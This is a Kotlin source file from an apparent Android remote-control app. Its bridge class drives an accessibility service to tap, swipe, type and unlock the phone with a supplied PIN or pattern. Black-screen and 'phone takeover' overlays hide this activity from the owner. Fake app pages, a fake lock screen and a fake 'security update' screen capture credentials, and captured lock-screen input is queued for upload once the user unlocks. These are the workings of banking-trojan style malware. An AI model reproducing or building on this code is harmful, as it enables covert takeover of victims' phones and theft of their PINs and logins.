package com.vibelink.client.accessibility

import com.vibelink.client.device.FakePageType
import com.vibelink.client.device.KeyguardFakePageType
import com.vibelink.client.service.RemoteAccessibilityService
import org.json.JSONObject

object AccessibilityControlBridge {
    @Volatile
    private var service: RemoteAccessibilityService? = null

    fun bind(service: RemoteAccessibilityService) {
        this.service = service
    }

    fun unbind(service: RemoteAccessibilityService) {
        if (this.service === service) {
            this.service = null
        }
    }

    fun isReady(): Boolean = service != null

    fun getService(): RemoteAccessibilityService? = service

    fun click(x: Float, y: Float): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performClick(x, y)
    }

    fun swipe(
        x1: Float,
        y1: Float,
        x2: Float,
        y2: Float,
        durationMs: Long,
    ): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performSwipe(x1, y1, x2, y2, durationMs)
    }

    fun inputText(text: String, mode: String = "replace"): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performInputText(text, mode)
    }

    fun swipeUpToUnlock(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performSwipeUpToUnlock()
    }

    fun wakeScreenForKeyguard(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.wakeScreenForKeyguard()
    }

    fun unlockPin(pin: String, swipeUpFirst: Boolean): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performUnlockPin(pin, swipeUpFirst)
    }

    fun unlockPattern(
        gesturePathJson: String,
        cellsPath: String = "",
        swipeUpFirst: Boolean,
        cellsOnly: Boolean = false,
    ): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performUnlockPattern(gesturePathJson, cellsPath, swipeUpFirst, cellsOnly)
    }

    fun isPatternViewVisible(): Boolean {
        return service?.isPatternViewVisible() == true
    }

    fun dumpKeyguardTree(maxDepth: Int = 5): String {
        val activeService = service
            ?: return "accessibility_service_not_connected"
        return activeService.dumpKeyguardTree(maxDepth)
    }

    fun dumpUiTree(maxDepth: Int = 24, maxNodes: Int = 2000, mode: String = "full"): JSONObject {
        val activeService = service
            ?: return JSONObject().put("error", "accessibility_service_not_connected")
        return activeService.dumpUiTree(maxDepth, maxNodes, mode)
    }

    fun reboot(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performReboot()
    }

    fun disableAccessibility(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performDisableAccessibility()
    }

    fun globalNavAction(action: String): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.performGlobalNavAction(action)
    }

    fun enableBlackScreen(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.enableBlackScreenOverlay()
    }

    fun disableBlackScreen(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.disableBlackScreenOverlay()
    }

    fun isBlackScreenActive(): Boolean = service?.isBlackScreenOverlayActive() == true

    fun enablePhoneTakeover(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.enablePhoneTakeoverOverlay()
    }

    fun disablePhoneTakeover(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.disablePhoneTakeoverOverlay()
    }

    fun isPhoneTakeoverActive(): Boolean = service?.isPhoneTakeoverOverlayActive() == true

    fun enableRemoteKeepAwake(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.enableRemoteKeepAwakeOverlay()
    }

    fun disableRemoteKeepAwake(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.disableRemoteKeepAwakeOverlay()
    }

    fun isRemoteKeepAwakeActive(): Boolean = service?.isRemoteKeepAwakeOverlayActive() == true

    fun setBlackScreenStreamCompatible(enabled: Boolean) {
        service?.setBlackScreenStreamCompatible(enabled)
    }

    fun isBlackScreenStreamCompatible(): Boolean =
        service?.isBlackScreenStreamCompatible() == true

    fun beginBlackScreenCaptureSession() {
        service?.beginBlackScreenCaptureSession()
    }

    fun endBlackScreenCaptureSession() {
        service?.endBlackScreenCaptureSession()
    }

    fun showFakePage(
        packageName: String,
        title: String,
        content: String,
        iconBase64: String,
        pageType: FakePageType = FakePageType.PIN,
        webUrl: String = "",
    ): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.showFakePageOverlay(
            packageName = packageName,
            title = title,
            content = content,
            iconBase64 = iconBase64,
            pageType = pageType,
            webUrl = webUrl,
        )
    }

    fun hideFakePage(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.hideFakePageOverlay()
    }

    fun tryShowArmedFakePageIfForeground(packageName: String): ControlResult {
        val activeService = service ?: return ControlResult(true)
        return activeService.tryShowArmedFakePageIfForeground(packageName)
    }

    fun hideFakePageForPackage(packageName: String?): ControlResult {
        val activeService = service ?: return ControlResult(true)
        return activeService.hideFakePageOverlayForPackage(packageName)
    }

    fun showKeyguardFakePage(
        title: String,
        hint: String,
        pageType: KeyguardFakePageType,
        webUrl: String = "",
        pinLength: Int = 6,
    ): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.showKeyguardFakePageOverlay(
            title = title,
            hint = hint,
            pageType = pageType,
            webUrl = webUrl,
            pinLength = pinLength,
        )
    }

    fun hideKeyguardFakePage(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.hideKeyguardFakePageOverlay()
    }

    fun isKeyguardFakePageActive(): Boolean =
        service?.isKeyguardFakeOverlayShowing() == true

    fun queryKeyguardLockType(): String? = service?.queryKeyguardLockType()

    fun showSecurityUpdateOverlay(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.showSecurityUpdateOverlay()
    }

    fun updateSecurityUpdateProgress(progress: Int, label: String): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.updateSecurityUpdateOverlayProgress(progress, label)
    }

    fun hideSecurityUpdateOverlay(): ControlResult {
        val activeService = service
            ?: return ControlResult(false, "accessibility_service_not_connected")
        return activeService.hideSecurityUpdateOverlay()
    }

    fun isSecurityUpdateOverlayShowing(): Boolean =
        service?.isSecurityUpdateOverlayShowing() == true

    /** Sync hide/show opaque black for one MediaProjection frame (Samsung captures overlays). */
    fun setOpaqueBlackVisible(visible: Boolean) {
        service?.setOpaqueBlackVisible(visible)
    }

    fun requestScreenRefresh() {
        ScreenRefreshBus.request()
    }

    /**
     * 对齐竞品 SCNReceiver USER_PRESENT：把内存/CURPST 草稿正式入队上报。
     * a11y 未绑定时仍可由 ConnectionService 冲 pending 队列。
     */
    fun commitKeyguardOnUserPresent() {
        service?.commitKeyguardCaptureOnUserPresent()
    }

    data class ControlResult(
        val ok: Boolean,
        val error: String? = null,
        val digitsEntered: Int = 0,
        val pinLength: Int = 0,
    )
}
